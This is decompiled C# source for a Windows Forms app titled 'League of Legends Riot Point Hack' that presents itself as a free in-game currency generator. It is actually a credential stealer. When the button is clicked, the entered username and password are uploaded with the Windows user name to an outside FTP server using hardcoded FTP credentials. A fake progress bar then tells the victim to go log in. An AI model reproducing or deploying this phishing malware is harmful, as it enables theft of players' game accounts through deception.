using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using hack.My.Resources;

namespace hack;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("PictureBox3")]
	private PictureBox _PictureBox3;

	[AccessedThroughProperty("PictureBox4")]
	private PictureBox _PictureBox4;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private int picloc;

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(Button1_MouseUp);
			EventHandler eventHandler = Button1_MouseLeave;
			MouseEventHandler val2 = new MouseEventHandler(Button1_MouseMove);
			MouseEventHandler val3 = new MouseEventHandler(Button1_MouseDown);
			EventHandler eventHandler2 = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_MouseUp(val);
				((Control)_Button1).remove_MouseLeave(eventHandler);
				((Control)_Button1).remove_MouseMove(val2);
				((Control)_Button1).remove_MouseDown(val3);
				((Control)_Button1).remove_Click(eventHandler2);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_MouseUp(val);
				((Control)_Button1).add_MouseLeave(eventHandler);
				((Control)_Button1).add_MouseMove(val2);
				((Control)_Button1).add_MouseDown(val3);
				((Control)_Button1).add_Click(eventHandler2);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox2 = value;
		}
	}

	internal virtual PictureBox PictureBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox3 = value;
		}
	}

	internal virtual PictureBox PictureBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox4 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_053b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0545: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		Button1 = new Button();
		PictureBox1 = new PictureBox();
		PictureBox2 = new PictureBox();
		PictureBox3 = new PictureBox();
		PictureBox4 = new PictureBox();
		Timer1 = new Timer(components);
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox3).BeginInit();
		((ISupportInitialize)PictureBox4).BeginInit();
		((Control)this).SuspendLayout();
		((TextBoxBase)TextBox1).set_BackColor(Color.Black);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)1);
		((Control)TextBox1).set_Font(new Font("MS Reference Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox1).set_ForeColor(SystemColors.Window);
		TextBox textBox = TextBox1;
		Point location = new Point(463, 158);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(187, 27);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		((TextBoxBase)TextBox2).set_BackColor(Color.Black);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)1);
		((Control)TextBox2).set_Font(new Font("MS Reference Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox2).set_ForeColor(SystemColors.Window);
		TextBox textBox3 = TextBox2;
		location = new Point(463, 246);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(187, 27);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(2);
		((ButtonBase)Button1).set_BackColor(Color.Black);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)1);
		((ButtonBase)Button1).set_Image((Image)(object)Resources.hack_it_button);
		Button button = Button1;
		location = new Point(463, 336);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(131, 81);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text(" ");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)PictureBox1).set_BackColor(Color.Transparent);
		PictureBox1.set_Image((Image)(object)Resources.lolhack_project);
		PictureBox pictureBox = PictureBox1;
		location = new Point(613, 321);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(117, 117);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(3);
		PictureBox1.set_TabStop(false);
		((Control)PictureBox2).set_BackColor(Color.Transparent);
		((Control)PictureBox2).set_BackgroundImageLayout((ImageLayout)3);
		PictureBox2.set_Image((Image)(object)Resources.progressbar);
		PictureBox pictureBox3 = PictureBox2;
		location = new Point(-741, 500);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox4 = PictureBox2;
		size = new Size(759, 27);
		((Control)pictureBox4).set_Size(size);
		PictureBox2.set_TabIndex(4);
		PictureBox2.set_TabStop(false);
		((Control)PictureBox3).set_BackColor(Color.Transparent);
		PictureBox pictureBox5 = PictureBox3;
		location = new Point(-35, 491);
		((Control)pictureBox5).set_Location(location);
		((Control)PictureBox3).set_Name("PictureBox3");
		PictureBox pictureBox6 = PictureBox3;
		size = new Size(53, 50);
		((Control)pictureBox6).set_Size(size);
		PictureBox3.set_TabIndex(5);
		PictureBox3.set_TabStop(false);
		((Control)PictureBox4).set_BackColor(Color.Transparent);
		PictureBox pictureBox7 = PictureBox4;
		location = new Point(780, 490);
		((Control)pictureBox7).set_Location(location);
		((Control)PictureBox4).set_Name("PictureBox4");
		PictureBox pictureBox8 = PictureBox4;
		size = new Size(53, 50);
		((Control)pictureBox8).set_Size(size);
		PictureBox4.set_TabIndex(6);
		PictureBox4.set_TabStop(false);
		Timer1.set_Interval(1);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.background2);
		size = new Size(804, 599);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)PictureBox4);
		((Control)this).get_Controls().Add((Control)(object)PictureBox3);
		((Control)this).get_Controls().Add((Control)(object)PictureBox2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_Text("League of Legends Riot Point Hack");
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox3).EndInit();
		((ISupportInitialize)PictureBox4).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_MouseDown(object sender, MouseEventArgs e)
	{
		((ButtonBase)Button1).set_BackColor(Color.DarkRed);
	}

	private void Button1_MouseMove(object sender, MouseEventArgs e)
	{
		((ButtonBase)Button1).set_BackColor(Color.CadetBlue);
	}

	private void Button1_MouseLeave(object sender, EventArgs e)
	{
		((ButtonBase)Button1).set_BackColor(Color.Black);
	}

	private void Button1_MouseUp(object sender, MouseEventArgs e)
	{
		((ButtonBase)Button1).set_BackColor(Color.Black);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Timer1.Start();
		WebClient webClient = new WebClient();
		webClient.Credentials = new NetworkCredential("jinko", "quenya93");
		webClient.UploadString("ftp://ftp.jinko.ji.ohost.de/" + Environment.UserName + "_lol_" + TextBox1.get_Text(), TextBox1.get_Text() + "\r\n" + TextBox2.get_Text() + "\r\n" + DateAndTime.get_DateString());
	}

	private int xrnd(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		int num = xrnd(0, 10);
		checked
		{
			picloc += num;
			if (picloc < 760)
			{
				PictureBox pictureBox = PictureBox2;
				Point location = new Point(((Control)PictureBox2).get_Location().X + num, ((Control)PictureBox2).get_Location().Y);
				((Control)pictureBox).set_Location(location);
			}
			else
			{
				Timer1.Stop();
				Interaction.MsgBox((object)"Go log in League of Legends and Have fun with new Riot Point!", (MsgBoxStyle)64, (object)null);
				((Form)this).Close();
			}
		}
	}
}
